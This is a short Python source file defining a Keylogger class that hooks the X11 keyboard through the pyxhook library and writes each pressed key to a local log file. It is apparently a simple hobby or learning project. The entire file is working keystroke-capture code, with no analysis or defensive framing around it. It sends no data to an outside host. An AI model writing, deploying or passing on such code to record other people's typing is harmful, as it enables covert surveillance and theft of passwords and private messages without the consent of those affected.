import logging
import pyxhook


class Keylogger:
    """ 
    Logs key events to a file
    """

    def __init__(self, filename: str):
        """
        Constructor
        
        :param filename: The name for the keylog file
        """
        
        self.filename = filename
        
        # Start hook manager
        self.manager = pyxhook.HookManager()


    def log(self):
        """ 
        Start logging key presses
        """
        
        # Assign callback for handling key strokes.
        self.manager.KeyDown = self._keydown_callback
        
        # Hook the keyboard and start logging.
        self.manager.HookKeyboard()
        self.manager.start()
        
    def kill(self):
        """
        Stops logging key events
        """
        
        # Stops listening for key events (I think?)
        self.manager.cancel()
        

    def _keydown_callback(self, key: pyxhook.pyxhook.PyxHookKeyEvent):
        """ 
        The handler for keyboard events
        
        :param key: The key down event
        """
        
        logging.debug(chr(key.Ascii))


    def setup(self):
        """
        Sets up the logging config
        """
        logging.basicConfig(
            level=logging.DEBUG,
            filename=self.filename,
            format='Key: %(message)s',
        )
    

